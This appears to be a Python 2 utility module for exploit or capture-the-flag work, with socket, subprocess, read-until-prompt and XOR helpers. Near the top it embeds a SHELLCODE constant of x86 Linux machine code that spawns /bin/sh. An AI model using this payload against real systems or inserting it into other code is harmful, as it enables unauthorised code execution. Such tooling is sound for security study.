import socket
import subprocess
import os, fcntl

# create a file that corresponds to a TCP socket to a remote host
# arguments:
#   host - hostname and port number in standard string
#          format (e.g. 'example.com:1337')
# returns:
#   a file object f
# notes:
#   - the file objects are buffered by default, so you will need
#     to call f.flush() to send a packet over the wire.
SHELLCODE="\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80"
def tcp(host):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	host = host.split(':')
	s.connect((host[0], int(host[1])))
	return s.makefile()

# communicate with a subprocess
# arguments:
#   cmd - shell command (redirections, etc. are supported)
# returns:
#   a tuple fd with three elements:
#      fd[0]: subprocess's stdin
#      fd[1]: subprocess's stdout
#      fd[2]: subprocess's stderr
# Notes:
#   - remember that fd[0].readline() will keep the trailing newline, so
#     EOF will return '' and blank line will return '\n'.  Also, remember
#     to rstrip() if necessary

def localcmd(cmd):
	s = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        setNonBlocking(s.stdout)
        setNonBlocking(s.stderr)
	return (s.stdin, s.stdout, s.stderr)

def setNonBlocking(fd):
	flags=fcntl.fcntl(fd, fcntl.F_GETFL)
	flags=flags | os.O_NONBLOCK
	fcntl.fcntl(fd, fcntl.F_SETFL, flags)

# read from a file/socket until a certain string is reached
# useful for disregarding input until you get to a prompt
# use in conjunction with formatted i/o functions or readline()
# arguments:
#   f - file/socket object to read from
#   key - prompt to search for
# example:
#   if f contains:
#      'foo bar baz > quux derp'
#   then if you do:
#      readUntil(f, ' > ')
#      print(f.readline().rstrip().split()[0])
#   the output will be:
#      quux

def readUntil(f, key):
	# get dummy string of same length as key
	buf = ''.join(chr((ord(c) + 1)  & 0xFF) for c in key)
	while buf != key:
		buf = buf[1:] + f.read(1)

#xor a string with a key
# both inputs are expected as strings
#
def xor(key, plain):
    return "".join(chr(ord(c)^ord(key)) for c in plain)

